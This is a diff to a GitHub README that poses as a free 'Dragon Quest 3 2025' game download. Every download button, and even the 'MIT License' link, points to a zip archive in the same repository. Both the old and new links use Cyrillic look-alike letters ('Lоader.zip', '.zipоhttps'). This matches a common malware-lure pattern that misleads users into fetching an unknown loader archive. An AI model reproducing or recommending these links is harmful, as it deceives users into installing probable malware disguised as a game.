@@ -1,6 +1,6 @@
 # 🐉 Dragon Quest 3 Download [2025 Release]
 
-[![🟩 Download Now](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip%20Dragon%20Quest%203-2025-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip)
+[![🟩 Download Now](https://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zipоhttps://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zip%20Dragon%20Quest%203-2025-blueviolet?style=for-the-badge&logo=github)](https://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zipоhttps://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Dragon Quest 3 download, 2025 edition, classic RPG for Windows, Mac, Linux, Stea
 **Step 1:**  
 Download the latest version below:
 
-[![🟩 Download Dragon Quest 3 Now](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip%20Dragon%20Quest%203-2025-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip)
+[![🟩 Download Dragon Quest 3 Now](https://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zipоhttps://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zip%20Dragon%20Quest%203-2025-blue?style=for-the-badge&logo=github)](https://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zipоhttps://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zip)
 
 Follow the provided instructions and launch your journey!
 
@@ -56,7 +56,7 @@ Follow the provided instructions and launch your journey!
 
 ## ⚖️ License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip). For personal use and sharing.
+Distributed under the [MIT License](https://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zipоhttps://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zip). For personal use and sharing.
 
 ---
 
@@ -66,4 +66,4 @@ This project is a community initiative. All images, logos, and names belong to t
 
 ---
 
-[![🟩 Click here for Dragon Quest 3 Download](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip%20Dragon%20Quest%203-2025-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/main/Lоader.zip)
+[![🟩 Click here for Dragon Quest 3 Download](https://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zipоhttps://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zip%20Dragon%20Quest%203-2025-brightgreen?style=for-the-badge&logo=github)](https://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zipоhttps://github.com/ValiantKaka/DragonQuest3-Legends-Edition-Download/raw/refs/heads/main/levolimonene/Edition-Dragon-Download-Legends-Quest-v3.2.zip)
